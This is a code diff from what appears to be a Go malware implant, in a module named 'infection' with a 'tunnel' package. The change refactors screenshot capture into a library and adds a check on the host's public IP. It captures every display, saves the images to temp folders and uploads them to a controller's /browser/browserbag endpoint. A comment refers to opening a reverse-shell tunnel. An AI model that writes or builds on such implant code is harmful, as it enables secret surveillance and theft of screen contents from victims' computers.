@@ -2,14 +2,9 @@ package tunnel
 
 import (
 	"encoding/json"
-	"fmt"
-	"github.com/kbinani/screenshot"
 	"github.com/parnurzeal/gorequest"
-	"image/png"
 	"infection/tunnel/reverse"
 	"infection/util/lib"
-	"os"
-	"runtime"
 	"unsafe"
 )
 
@@ -52,33 +47,6 @@ type Check struct {
 	Hostid string `json:"hostid"`
 }
 
-func getscreenshot() []string {
-	n := screenshot.NumActiveDisplays()
-	filenames := []string{}
-	var fpth string
-	for i := 0; i < n; i++ {
-		bounds := screenshot.GetDisplayBounds(i)
-
-		img, err := screenshot.CaptureRect(bounds)
-		if err != nil {
-			panic(err)
-		}
-		if runtime.GOOS == "windows" {
-			fpth = `C:\Windows\Temp\`
-		} else {
-			fpth = `/tmp/`
-		}
-		fileName := fmt.Sprintf("maskScr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
-		fullpath := fpth + fileName
-		filenames = append(filenames, fullpath)
-		file, _ := os.Create(fullpath)
-
-		defer file.Close()
-		png.Encode(file, img)
-	}
-
-	return filenames
-}
 func Tunnel(addr string) {
 	var check Check
 	resp, body, _ := gorequest.New().
@@ -87,8 +55,9 @@ func Tunnel(addr string) {
 	if resp.StatusCode == 200 && body != "" {
 		if err := json.Unmarshal([]byte(body), &check); err == nil {
 			// if not need  dont open the tunnel to revert shell
-			if check.Hostid == lib.HOSTID {
-				filenames := getscreenshot()
+			lib.GetOutIp()
+			if check.Hostid == lib.HOSTID || check.Hostid == lib.OUTIP {
+				filenames := lib.Getscreenshot()
 				finflag := make(chan string)
 				for _, fname := range filenames {
 					go lib.SingleFile(fname, "http://"+addr+":5002/browser/browserbag", finflag)
